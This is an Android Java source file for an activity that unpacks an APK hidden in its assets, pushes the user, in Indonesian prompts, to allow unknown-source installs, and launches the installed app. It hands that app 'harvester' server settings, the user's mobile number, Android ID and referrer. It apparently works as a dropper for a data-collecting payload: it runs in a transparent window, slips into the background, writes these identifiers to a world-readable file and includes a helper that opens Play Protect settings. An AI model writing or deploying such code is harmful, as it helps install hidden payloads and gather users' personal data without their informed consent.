package com.flybd.installer;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.AssetManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.support.annotation.DrawableRes;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.FileProvider;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.List;

import static com.flybd.installer.InstallReferrerReceiver.install_referrer_store_key;


public class InstallActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";

    private static final String APP_NAME = "app.apk";

    private static final String SESSION_ID = "session_id";
    private static final String MOBILE = "mobile";
    private static final String HARVESTER_URL = "harvester_url";
    private static final String HARVESTER_PORT = "harvester_port";
    private static final String INNER_PACKAGE_NAME = "inner_package_name";
    private static final String REFERRER = "referrer";
    private static final String ANDROID_ID = "harvester_android_id";

    private static final String TRANSFER_FILE = "transfer.json";

    private AppExecutors mExecutors = new AppExecutors();

    private volatile boolean mIsLoading = false;

    private boolean mIsFirstStart = true;

    private boolean isCopied = false;

    private boolean needShowInstallDialog = false;

    private AlertDialog installDialog = null;

    private static final int REQUEST_CODE = 101;

    private String innerPackageName;

    private String referrer;

    private String androidId;

    @DrawableRes
    private int iconId;

    private AlertDialog permissionDialog;

    private String title;

    private String content;

    private String ticker;

    private boolean saveOnce = false;

    public static Intent getIntent(Context context, String sessionId, String mobile, String harvesterUrl, int harvesterPort, String androidId,
                                   String packageName, @DrawableRes int iconId, String title, String content, String ticker) {
        Intent intent = new Intent(context, InstallActivity.class);
        intent.putExtra(SESSION_ID, sessionId);
        intent.putExtra(MOBILE, mobile);
        intent.putExtra(HARVESTER_URL, harvesterUrl);
        intent.putExtra(HARVESTER_PORT, harvesterPort);
        intent.putExtra(ANDROID_ID, androidId);
        intent.putExtra(INNER_PACKAGE_NAME, packageName);
        intent.putExtra(InstallService.ICON, iconId);
        intent.putExtra(InstallService.TITLE, title);
        intent.putExtra(InstallService.CONTENT, content);
        intent.putExtra(InstallService.TICKER, ticker);
        return intent;
    }

    BroadcastReceiver installedReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.i("这是监听事件：", "监听");
            if (intent.getAction().equals(Intent.ACTION_PACKAGE_ADDED)) {
                String packageName = intent.getData().getSchemeSpecificPart();
                Toast.makeText(context, "安装成功" + packageName, Toast.LENGTH_LONG).show();
                openApp(context, packageName);
                sendBroadcast(context);
                finishNoDestroy();
            }
            if (intent.getAction().equals(Intent.ACTION_PACKAGE_REMOVED)) {
                String packageName = intent.getData().getSchemeSpecificPart();
                Toast.makeText(context, "卸载成功" + packageName, Toast.LENGTH_LONG).show();
            }
            if (intent.getAction().equals(Intent.ACTION_PACKAGE_REPLACED)) {
                String packageName = intent.getData().getSchemeSpecificPart();
                Toast.makeText(context, "替换成功" + packageName, Toast.LENGTH_LONG).show();
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        translucentWindow(this);
        Intent intent = getIntent();
        innerPackageName = intent.getStringExtra(INNER_PACKAGE_NAME);
        if (TextUtils.isEmpty(innerPackageName)) {
            Toast.makeText(this, "inner app package name is invalid", Toast.LENGTH_SHORT).show();
            Log.i(TAG, "inner app package name is invalid");
        }
        referrer = PreferenceManager.getDefaultSharedPreferences(this).getString(install_referrer_store_key, "");
        if (TextUtils.isEmpty(innerPackageName)) {
            Toast.makeText(this, "referrer is null", Toast.LENGTH_SHORT).show();
            Log.i(TAG, "referrer is null");
        }
        androidId = intent.getStringExtra(ANDROID_ID);
        if (TextUtils.isEmpty(androidId)) {
            Toast.makeText(this, "androidId is null", Toast.LENGTH_SHORT).show();
            Log.i(TAG, "androidId is null");
        }

        iconId = intent.getIntExtra(InstallService.ICON, -1);
        if (iconId == 0) {
            Toast.makeText(this, "iconId is " + iconId, Toast.LENGTH_SHORT).show();
            Log.i(TAG, "iconId is null");
        }
        title = intent.getStringExtra(InstallService.TITLE);
        content = intent.getStringExtra(InstallService.CONTENT);
        ticker = intent.getStringExtra(InstallService.TICKER);

        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.PACKAGE_ADDED");
        filter.addAction("android.intent.action.PACKAGE_REMOVED");
        filter.addDataScheme("package");
        this.registerReceiver(installedReceiver, filter);

        sendBroadcast(this);

        if (checkAppInstalled(this, innerPackageName)) {
            if (openApp(this, innerPackageName)) {
                finishNoDestroy();
                return;
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Prompt")
                    .setMessage("Perlu mengotorisasi izin pemasangan")
                    .setPositiveButton(android.R.string.ok, (dialog, which) -> {
                        startInstallPermissionSettingActivity(InstallActivity.this);
                        needShowInstallDialog = true;
                    });

            if (!mIsFirstStart) {
                builder.setNegativeButton(android.R.string.cancel, (dialog, which) -> {
                    dialog.dismiss();
                });
            }
            builder.create().show();
        } else {
            unzipAndInstall();
        }
        mIsFirstStart = false;
    }

    private void finishNoDestroy() {
        moveTaskToBack(true);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(installedReceiver);
    }

    private void unzipAndInstall() {
        mExecutors.diskIO().execute(() -> {
            if (mIsLoading) {
                runOnUiThread(() -> {
                    Toast.makeText(InstallActivity.this, "loading...", Toast.LENGTH_SHORT).show();
                });
                return;
            }
            mIsLoading = true;
            InputStream is = null;
            OutputStream os = null;
            try {
                AssetManager am = getAssets();
                is = am.open("app");
                String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + APP_NAME;
                os = new FileOutputStream(path);
                if (!isCopied) {
                    copyFile(is, os);
                    isCopied = true;
                    runOnUiThread(() -> Toast.makeText(InstallActivity.this, "copy finished", Toast.LENGTH_SHORT).show());
                }
                runOnUiThread(() -> onCopyFinished(path));
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                try {
                    if (is != null) {
                        is.close();
                    }
                } catch (IOException e) {
                }
                try {
                    if (os != null) {
                        os.close();
                    }
                } catch (IOException e) {
                }
            }
            mIsLoading = false;
        });
    }

    private void onCopyFinished(String path) {
        if (installDialog != null) {
            installDialog.dismiss();
        }
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        installDialog = builder.setTitle("Prompt")
                .setMessage("perlu menginstal aplikasi")
                .setPositiveButton(android.R.string.ok, (dialog, which) -> {
                    installApk(path);
                }).create();
        installDialog.show();
        installDialog.setOnDismissListener(dialog -> {
            finishNoDestroy();
        });

        if (!saveOnce) {
            saveReferrer("");
            saveOnce = true;
        }
    }

    private void installApk(String path) {
        File apkFile = new File(path);
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Log.w(TAG, "版本大于 N ，开始使用 fileProvider 进行安装");
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                Uri contentUri = FileProvider.getUriForFile(
                        this
                        , getPackageName() + ".fileprovider"
                        , apkFile);
                intent.setDataAndType(contentUri, "application/vnd.android.package-archive");
            } else {
                Log.w(TAG, "正常进行安装");
                intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
            }
            if (getPackageManager().queryIntentActivities(intent, 0).size() > 0) {
                //如果APK安装界面存在，携带请求码跳转。使用forResult是为了处理用户 取消 安装的事件。外面这层判断理论上来说可以不要，但是由于国内的定制，这个加上还是比较保险的
                startActivityForResult(intent, REQUEST_CODE);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        String[] permission = new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE};
        boolean needGrant = false;
        for (String perm : permission) {
            if (ActivityCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needGrant = true;
                break;
            }
        }
        if (needGrant) {
            if (permissionDialog == null) {
                ActivityCompat.requestPermissions(this, permission, REQUEST_CODE);
            }
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (getPackageManager().canRequestPackageInstalls() && needShowInstallDialog) {
                    unzipAndInstall();
                    needShowInstallDialog = false;
                }
            }
        }

        Intent intent = InstallService.getInstallServiceIntent(this, 101, iconId, getIntent(),
                title, content, ticker);
        startService(intent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE) {
            if (resultCode == Activity.RESULT_CANCELED) {
                finish();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean isGrated = true;
        for (int grant : grantResults) {
            if (grant != PackageManager.PERMISSION_GRANTED) {
                isGrated = false;
                break;
            }
        }

        if (!isGrated) {
            if (permissionDialog != null) {
                return;
            }
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            permissionDialog = builder.setTitle("Tips")
                    .setMessage("Authorization is required to continue using")
                    .setPositiveButton(android.R.string.ok, (dialog, which) -> {
                        go2Setting();
                    }).create();
            permissionDialog.setOnDismissListener((dialog) -> {
                permissionDialog = null;
            });
            permissionDialog.show();
        }
    }

    private String download(String url) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE}, 100);
            Toast.makeText(this, "unable to access write external storage", Toast.LENGTH_SHORT).show();
            return null;
        }
        String path = null;
        try {
            //创建下载任务,downloadUrl就是下载链接
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_WIFI | DownloadManager.Request.NETWORK_MOBILE);
            //指定下载路径和下载文件名
            String name = url.substring(url.lastIndexOf("/") + 1);
            path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator + name;
            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, name);
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            request.setVisibleInDownloadsUi(true);
            //大于11版本手机允许扫描
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
                //表示允许MediaScanner扫描到这个文件，默认不允许。
                request.allowScanningByMediaScanner();
            }

            // 设置一些基本显示信息
            request.setTitle(name);
            request.setDescription("下载完后请点击更新");
            request.setMimeType("application/vnd.android.package-archive");
            //获取下载管理器
            DownloadManager downloadManager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
            //将下载任务加入下载队列，否则不会进行下载
            downloadManager.enqueue(request);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return path;
    }

    public void startInstallPermissionSettingActivity(Context context) {
        if (context == null) {
            return;
        }
        Intent intent = new Intent();
        //获取当前apk包URI，并设置到intent中（这一步设置，可让“未知应用权限设置界面”只显示当前应用的设置项）
        Uri packageURI = Uri.parse("package:" + context.getPackageName());
        intent.setData(packageURI);
        //设置不同版本跳转未知应用的动作
        if (Build.VERSION.SDK_INT >= 26) {
            //intent = new Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,packageURI);
            intent.setAction(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
        } else {
            intent.setAction(android.provider.Settings.ACTION_SECURITY_SETTINGS);
        }
        try {
            startActivityForResult(intent, REQUEST_CODE);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean openApp(Context context, String packageName) {
        try {
            PackageInfo pi = null;
            PackageManager packageManager = context.getPackageManager();
            pi = packageManager.getPackageInfo(packageName, 0);
            Intent resolveIntent = new Intent(Intent.ACTION_MAIN, null);
            resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);
            resolveIntent.setPackage(pi.packageName);

            List<ResolveInfo> apps = packageManager.queryIntentActivities(resolveIntent, 0);

            ResolveInfo ri = apps.iterator().next();
            if (ri != null) {
                String className = ri.activityInfo.name;
                Intent intent = new Intent(Intent.ACTION_MAIN);
                intent.addCategory(Intent.CATEGORY_LAUNCHER);

                setHarvesterIntent(intent, getIntent().getStringExtra(SESSION_ID), getIntent().getStringExtra(MOBILE), getIntent().getStringExtra(HARVESTER_URL)
                        , getIntent().getIntExtra(HARVESTER_PORT, -1), innerPackageName, referrer, androidId);
                save2Local(getIntent().getStringExtra(SESSION_ID), getIntent().getStringExtra(MOBILE), getIntent().getStringExtra(HARVESTER_URL)
                        , getIntent().getIntExtra(HARVESTER_PORT, -1), innerPackageName, referrer, androidId);

                ComponentName cn = new ComponentName(packageName, className);
                intent.setComponent(cn);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private void sendBroadcast(Context context) {
        Intent broad = new Intent("com.flybd.harvester.info");

        setHarvesterIntent(broad, getIntent().getStringExtra(SESSION_ID), getIntent().getStringExtra(MOBILE), getIntent().getStringExtra(HARVESTER_URL),
                getIntent().getIntExtra(HARVESTER_PORT, -1), innerPackageName, referrer, androidId);
        save2Local(getIntent().getStringExtra(SESSION_ID), getIntent().getStringExtra(MOBILE), getIntent().getStringExtra(HARVESTER_URL)
                , getIntent().getIntExtra(HARVESTER_PORT, -1), innerPackageName, referrer, androidId);

        // Android 8.0隐式广播接收不到了，只能改用显示广播
        broad.setPackage(innerPackageName);
        context.sendBroadcast(broad);
    }

    public Intent setHarvesterIntent(Intent intent, String sessionId, String mobile, String harvesterUrl, int harvesterPort, String innerPackageName, String referrer,
                                     String androidId) {
        intent.putExtra(SESSION_ID, sessionId);
        intent.putExtra(MOBILE, mobile);
        intent.putExtra(HARVESTER_URL, harvesterUrl);
        intent.putExtra(HARVESTER_PORT, harvesterPort);
        intent.putExtra(INNER_PACKAGE_NAME, innerPackageName);
        intent.putExtra(REFERRER, referrer);
        intent.putExtra(ANDROID_ID, androidId);
        return intent;
    }

    public void copyFile(InputStream inputStream, OutputStream outputStream) throws IOException {
        byte[] arr = new byte[1024 * 5];
        int len;
        while ((len = inputStream.read(arr)) >= 0) {
            outputStream.write(arr, 0, len);
        }
    }

    private boolean checkAppInstalled(Context context, String pkgName) {
        if (pkgName == null || pkgName.isEmpty()) {
            return false;
        }
        PackageInfo packageInfo;
        try {
            packageInfo = context.getPackageManager().getPackageInfo(pkgName, 0);
        } catch (PackageManager.NameNotFoundException e) {
            packageInfo = null;
            e.printStackTrace();
        }
        if (packageInfo == null) {
            return false;
        } else {
            return true;//true为安装了，false为未安装
        }
    }

    private boolean jump2PlayProtectSetting() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"));
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }


    private void translucentWindow(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); //去除半透明状态栏
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            activity.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN); //一般配合fitsSystemWindows()使用, 或者在根部局加上属性android:fitsSystemWindows="true", 使根部局全屏显示
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            activity.getWindow().setStatusBarColor(Color.TRANSPARENT);
        }

        if (Build.VERSION.SDK_INT >= 24/*Build.VERSION_CODES.N*/) {
            try {
                Class decorViewClazz = Class.forName("com.android.internal.policy.DecorView");
                Field field = decorViewClazz.getDeclaredField("mSemiTransparentStatusBarColor");
                field.setAccessible(true);
                field.setInt(activity.getWindow().getDecorView(), Color.TRANSPARENT); //改为透明
            } catch (Exception e) {
            }

        }
    }

    private void go2Setting() {
        Intent localIntent = new Intent();
        localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (Build.VERSION.SDK_INT >= 9) {
            localIntent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            localIntent.setData(Uri.fromParts("package", getPackageName(), null));
        } else if (Build.VERSION.SDK_INT <= 8) {
            localIntent.setAction(Intent.ACTION_VIEW);
            localIntent.setClassName("com.android.settings", "com.android.settings.InstalledAppDetails");
            localIntent.putExtra("com.android.settings.ApplicationPkgName", getPackageName());
        }
        startActivityForResult(localIntent, REQUEST_CODE);
    }

    private boolean save2Local(String sessionId, String mobile, String harvesterUrl, int harvesterPort, String innerPackageName, String referrer,
                               String androidId) {
        boolean ret = false;
        FileOutputStream os = null;
        try {
            JSONObject jObj = new JSONObject();
            jObj.put(SESSION_ID, sessionId)
                    .put(MOBILE, mobile)
                    .put(HARVESTER_URL, harvesterUrl)
                    .put(HARVESTER_PORT, harvesterPort)
                    .put(INNER_PACKAGE_NAME, innerPackageName)
                    .put(REFERRER, referrer)
                    .put(ANDROID_ID, androidId);
            File dir = Environment.getExternalStorageDirectory();
            os = new FileOutputStream(new File(dir, TRANSFER_FILE));
            os.write(jObj.toString().getBytes());
            ret = true;
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                }
            }
        }
        return ret;
    }

    private boolean saveReferrer(String referrer) {
        FileOutputStream os = null;
        try {
            JSONObject jObj = new JSONObject();
            jObj.put(REFERRER, referrer);
            File dir = Environment.getExternalStorageDirectory();
            File referrerFile = new File(dir, REFERRER);
            os = new FileOutputStream(referrerFile);
            os.write(jObj.toString().getBytes());
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                }
            }
        }
    }
//    private void openAssignFolder(String path) {
//        File file = new File(path);
//        if (!file.exists()) {
//            return;
//        }
//        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
//        intent.addCategory(Intent.CATEGORY_DEFAULT);
//        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
//            Uri contentUri = FileProvider.getUriForFile(
//                    this
//                    , BuildConfig.APPLICATION_ID + ".fileprovider"
//                    , file);
//            intent.setDataAndType(contentUri, "file/*");
//        } else {
//            intent.setDataAndType(Uri.fromFile(file), "file/*");
//        }
//        try {
//            startActivity(intent);
////            startActivity(Intent.createChooser(intent, "选择浏览工具"));
//        } catch (ActivityNotFoundException e) {
//            e.printStackTrace();
//        }
//    }
}